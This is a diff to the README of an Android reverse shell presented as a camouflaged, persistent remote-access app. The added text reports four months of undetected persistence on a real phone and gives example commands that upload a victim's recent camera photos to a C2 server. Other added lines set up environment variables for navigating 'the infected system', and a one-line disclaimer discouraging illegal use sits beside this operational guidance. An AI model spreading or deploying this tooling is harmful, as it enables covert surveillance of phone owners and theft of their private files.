@@ -3,6 +3,8 @@ This is my Android Reverse Shell with dropping capabilities.
 
 The idea was to create a Termux-like environment with a main APK with core functionality, capable of dropping additional executables and scripts.
 
+This app was made for fun and informational purposes only. I strongly discourage any illegal use of the app! Please be responsible.
+
 ## Features
 - **Secure TLS shell**
 - **Persistent** over time and reboots
@@ -15,6 +17,12 @@ Executable and scripts integrated by default:
 - custom script for file exfiltration over HTTPS (`uplaod`, a file receiver is included in this project; see "httpServerFileReceiver" folder)
 - custom script to get device public IP (`ipinfo`)
 - custom script to override `whoami` and set a custom "victim id" (`whoami`)
+
+## Performances
+
+The Reverse Shell was tested on Android 8, 11, 12 and 13.
+
+A long time test was successfully performed on a real Android 12 device: the shell has been active for 4 consecutive months without any kind of restart or interruption by the user. During this period, several system reboots and network disconnections were performed to verify the persistence of the app.
 
 ## Screenshots
 This is the Reverse Shell in action. On the right side you can see the device app drawer: can you guess where is the malicious app? From a visual perspective the reverse shell is perfectly camouflaged with other Google Apps.
@@ -83,7 +91,7 @@ You can use an IP or an hostname. Example:
         const val RETRY = 5
     }
 ```
-Ofcourse you must use a **public address**, set **port forwarding** and firewall rules on your router. Additionally, you can use DNS, Ngrok and other services for reachability and to route your traffic but **how to set this configurations or use those services is out of the scope of this documentation!**
+Of course you must use a **public address**, set **port forwarding** and firewall rules on your router. Additionally, you can use DNS, Ngrok and other services for reachability and to route your traffic but **how to set this configurations or use those services is out of the scope of this documentation!**
 
 ### How to start a session
 1. Generate a certificate for the TLS connection on your C2 server:
@@ -106,6 +114,16 @@ If the request return `200 OK` the file is already on the server so it's not upl
 
 The file is located in `./revshellSdk28/app/src/main/res/raw/upload` and **you must modify it to set your C2 server!**
 
+Example on how to upload a file:
+```
+upload file.bin
+```
+
+Example on how to upload most recent photos from the Camera folder:
+```
+cd ./DCIM/Opencamera && find $(pwd) -type f -mtime -30 -exec upload {} \;
+```
+
 Note: *a simple Python HTTP file receiver is included in this project. See "httpServerFileReceiver" folder. Put your certificate in "https" subfolder. Received files are located in "files" subfolder. Edit "server.py" as you wish.*
 
 
@@ -115,3 +133,15 @@ In the app environment there is no DNS configuration so in order to perform a co
 For example to use Curl you must use the `--dns-servers` flag.
 
 Example: `curl --dns-servers 8.8.8.8,8.8.4.4 https://google.com`
+
+### Usefull variables
+In order to easily navigate on the infected system you can use the following Environment Variables:
+- `HOME` set to `/storage/self/primary`
+- `DEN` set to `/data/data/org.android.settings`
+- `BINS` set to `/data/data/org.android.settings/.files/usr/bin`
+- `PATH` set to `${'$'}BINS:${'$'}DEN:${'$'}PATH`
+
+# TODO
+Seems like the app notification permission is not enabled by default (you must enable it manually in the system settings) on some devices running Android 13.
+
+This problem is under investigation.
